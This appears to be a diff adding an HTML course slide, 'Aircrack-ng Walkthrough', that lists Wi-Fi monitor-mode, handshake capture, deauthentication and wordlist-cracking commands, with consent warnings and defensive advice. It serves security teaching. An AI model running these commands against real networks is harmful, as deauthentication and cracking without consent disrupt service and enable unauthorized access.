@@ -1,0 +1,44 @@
+<div class="h-full w-full flex flex-col p-5 relative overflow-hidden cohortia-bg" data-theme="light">
+  <style>.cohortia-bg{background:#ffffff}.card-border{border:1px solid rgba(226,232,240,0.9)}.mono{font-family:ui-monospace,Menlo,monospace}</style>
+  <div class="flex items-center gap-2 text-[10px] font-bold uppercase tracking-wider text-slate-500 mb-4">
+    <span class="px-2 py-1 rounded-md bg-blue-50 text-blue-700 border border-blue-100">Module 7</span>
+    <span>›</span>
+    <span>Chapter 7.6</span>
+    <span>›</span>
+    <span class="text-slate-700">Aircrack-ng Walkthrough</span>
+  </div>
+
+  <div class="flex-1 grid grid-cols-12 gap-4 h-full">
+    <div class="col-span-7 rounded-2xl bg-white p-5 card-border shadow-sm h-full">
+      <div class="text-sm font-bold text-slate-800">Preparation and capture (simulated)</div>
+      <pre class="mono text-sm mt-3 whitespace-pre-wrap p-3 bg-slate-50 rounded-md card-border">sudo airmon-ng check kill
+sudo airmon-ng start wlan0    # creates wlan0mon
+sudo airodump-ng wlan0mon     # discover SSIDs and channels
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
+sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 wlan0mon  # if allowed by scope
+aircrack-ng -w wordlist.txt capture-01.cap</pre>
+      <div class="mt-3 text-sm text-slate-600">These commands are shown as a lab demonstration only. Do not run against networks without written consent. Use monitor-capable hardware and verify your interface with iwconfig or airmon-ng.</div>
+    </div>
+
+    <div class="col-span-5 flex flex-col gap-3">
+      <div class="rounded-2xl bg-white p-4 card-border shadow-sm">
+        <div class="text-sm font-bold text-slate-800">Interpretation</div>
+        <ul class="mt-2 list-disc pl-5 text-sm text-slate-600">
+          <li>airodump-ng identifies SSIDs and writes capture files.</li>
+          <li>Deauth can produce a handshake but is intrusive and must be allowed.</li>
+          <li>aircrack-ng performs offline cracking against captured handshakes with a wordlist.</li>
+        </ul>
+      </div>
+
+      <div class="rounded-lg bg-white p-3 card-border shadow-sm">
+        <div class="text-xs font-bold uppercase tracking-wider text-slate-500">Concrete example</div>
+        <p class="text-sm text-slate-600 mt-2">In a lab, capture a handshake from a guest SSID, then run aircrack-ng with a reasonable wordlist. Record time-to-crack and recommend stronger passphrase policies if cracked quickly.</p>
+      </div>
+
+      <div class="mt-auto rounded-xl border-l-4 border-l-rose-500 bg-rose-50 p-3">
+        <div class="text-[10px] font-bold uppercase tracking-wider text-rose-700">Common Mistake</div>
+        <p class="text-xs font-medium text-slate-800">Performing active deauth in production without rollback or approvals can cause outages and legal exposure.</p>
+      </div>
+    </div>
+  </div>
+<style>pre, code, [class*="code"], [class*="editor"], [class*="snippet"], [class*="source"] { white-space: pre-wrap; tab-size: 2; }</style></div>
